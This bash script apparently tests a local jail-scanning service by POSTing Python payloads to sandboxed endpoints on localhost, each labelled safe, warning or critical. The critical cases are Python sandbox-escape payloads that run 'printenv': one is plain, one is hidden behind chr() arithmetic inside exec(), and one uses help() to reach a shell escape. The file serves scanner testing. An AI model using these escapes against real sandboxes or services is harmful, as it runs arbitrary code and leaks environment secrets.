#!/bin/bash

# POST /scan
# Example Data (critical)
##################################################
# {
#    "endpoint": ["localhost", "4444"],
#    "payloads": ["help()", "os", ":!printenv"],
#    "unexpecteds": ["PyJailBreak_b981a35bde"],
#    "risk":"critical"
# }
##################################################
# risks: safe, unknown, ["critical", "warning"]
# envの文字列検証を行うことで、任意コード実行とファイル読み取りの両方を検知できる


# safe
curl -X POST -H 'Content-Type: application/json' http://localhost:8080/scan -d \
'{
    "endpoint": ["localhost", "4441"],
    "payloads": ["77*77"],
    "unexpecteds": ["5929"],
    "risk":"safe"
}'
curl -X POST -H 'Content-Type: application/json' http://localhost:8080/scan -d \
'{
    "endpoint": ["localhost", "4441"], 
    "payloads": ["__import__(\"os\").system(\"printenv\")"], 
    "unexpecteds": ["PyJailBreak_b981a35bde"], 
    "risk":"critical"
}'

# warning
curl -X POST -H 'Content-Type: application/json' http://localhost:8080/scan -d \
'{
    "endpoint": ["localhost", "4441"], 
    "payloads": ["print(\"Satoki\")"], 
    "unexpecteds": ["Satoki"], 
    "risk":"warning"
}'

# critical
curl -X POST -H 'Content-Type: application/json' http://localhost:8080/scan -d \
'{
    "endpoint": ["localhost", "4443"], 
    "payloads": ["exec(chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(111+1)+chr(111)+chr(111+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(111)+chr(111+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1+1)+chr(11+11+11+11+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1+1+1+1+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(111+1)+chr(111+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+11)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1)+chr(11+11+11+11+11+11+11+11+11+11)+chr(111+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1+1))"], 
    "unexpecteds": ["PyJailBreak_b981a35bde"], 
    "risk":"critical"
}'

curl -X POST -H 'Content-Type: application/json' http://localhost:8080/scan -d \
'{
    "endpoint": ["localhost", "4444"], 
    "payloads": ["help()", "os", ":!printenv"], 
    "unexpecteds": ["PyJailBreak_b981a35bde"], 
    "risk":"critical"
}'





